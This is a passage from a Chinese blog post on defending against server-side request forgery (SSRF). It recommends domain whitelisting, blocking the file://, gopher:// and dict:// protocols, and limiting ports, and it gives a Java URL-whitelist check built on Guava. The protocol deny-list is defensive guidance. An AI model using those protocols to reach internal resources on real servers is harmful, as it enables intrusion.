对请求地址设置白名单，只允许请求白名单内的地址。</span><br><span class="line">3. 禁用除http和https外的协议，如：file://，gopher://，dict://等</span><br><span class="line">4. 限制请求的端口为固定服务端口，如：80，443</span><br><span class="line">5. Java类代码修复，来自：joychou</span><br><span class="line"></span><br><span class="line">方法调用：</span><br><span class="line"></span><br><span class="line">```java</span><br><span class="line">String[] urlwhitelist = &#123;&quot;joychou.com&quot;, &quot;joychou.me&quot;&#125;;</span><br><span class="line">if (!UrlSecCheck(url, urlwhitelist)) &#123;</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>方法代码：</p>
<p>需要先添加guava库（目的是获取一级域名）</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.google.guava<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>guava<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>21.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">方法实现：</span><br><span class="line">public static Boolean UrlSecCheck(String url, String[] urlwhitelist) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        URL u = new URL(url);</span><br><span class="line">        // 只允许http和https的协议</span><br><span class="line">        if (!u.getProtocol().startsWith("http") &amp;&amp; !u.getProtocol().startsWith("https")) &#123;</span><br><span class="line">            return  false;</span><br><span class="line">        &#125;</span><br><span class="line">        // 获取域名，并转为小写</span><br><span class="line">        String host = u.getHost().toLowerCase();</span><br><span class="line">        // 获取一级域名</span><br><span class="line">        String rootDomain = InternetDomainName.from(host).topPrivateDomain().toString();</span><br><span class="line"></span><br><span class="line">        for (String whiteurl: urlwhitelist)&#123;</span><br><span class="line">            if (rootDomain.equals(whiteurl)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line"></span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

          </div>
          <br><br>
              
                <div class="license-wrapper">
                    <p>原文作者：<a href="">Misaki</a>
                    <p>原文链接：<a href="/2019/06/SSRF/">/2019/06/SSRF/</a>
                    <p>发表日期：<a href="/2019/06/SSRF/">June 14th 2019, 3:46:34 pm</a>
                    <p>更新日期：<a href="/2019/06/SSRF/">June 14th 2019, 3:58:43 pm</a>
                    <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
                </div>
              
          <br><br>
          <div>
              <p>
                       
                      <span class="badge badge-default">#&nbsp;web安全</span>
                      &nbsp;
                      
              </p>
          </div>
        </div>
      </div>  
    </div>
  </div>
  <!-- TOC -->
  
      <div class="">
        <div id="toc">
          <p class="toc-title"><i class="material-icons" style="vertical-align:middle">toc</i>Toc:</p> 
          <div id="tocbot"></div>
        </div>
      </div>
  
</div>


<!-- Comments -->
<div class="row">
    <div class="col-md-8 offset-md-2">
    
        
            <div class="disqus" style="width:100%">
    <div id="disqus_thread"></div>
    <script>               
        var disqus_shortname = '';
        var disqus_config = function () {
            this.page.url = '/2019/06/SSRF/'; 
            this.page.identifier = '/2019/06/SSRF/';
        };
        (function() { 
            var d = document, s = d.createElement('script');
            s.type = 'text/javascript';
            s.src = '//'+disqus_shortname+'.disqus.com/embed.js';
            s.setAttribute('data-timestamp', +new Date());
            (d.head || d.body).appendChild(s);
        })();
    </script>
    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>                                
</div>
        
    
    </div>
</div>
  

<footer class="footer footer-default">
        <div class="container">
          <div class="float-left" style="padding: 15px 0;">
              <b>假如今天的你被生活辜负了，别伤心，因为明天生活还会继续辜负你！</b>
          </div>
          <div align="right" style="padding: 15px 0;">
              <i class="iconfont icon-love" ></i>
              <a href="https://github.com/0x2e/Material-T" target="_blank"> <b>Material-T</b></a>
          </div>
        </div>
</footer>
      <!--   Core JS Files   -->
      <script src="/js/core/jquery.min.js?v=3.2.1"></script>
      <script src="/js/main.js"></script>
      <script src="/js/core/popper.min.js"></script>
      <script src="/js/core/bootstrap-material-design.min.js"></script>
      <script src="/js/plugins/moment.min.js"></script>
      <script src="/js/material-kit.min.js?v=2.0.5"></script>
      
        <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
        <script src="/js/post.js"></script>
        <script src="/js/plugins/prettify.js"></script>
        <script>
            $(document).ready(function(){
                $('pre').addClass('prettyprint linenums');
                prettyPrint();
            })
        </script>
      
<script src="/live2d-widget/autoload.js"></script>
</body>
</html>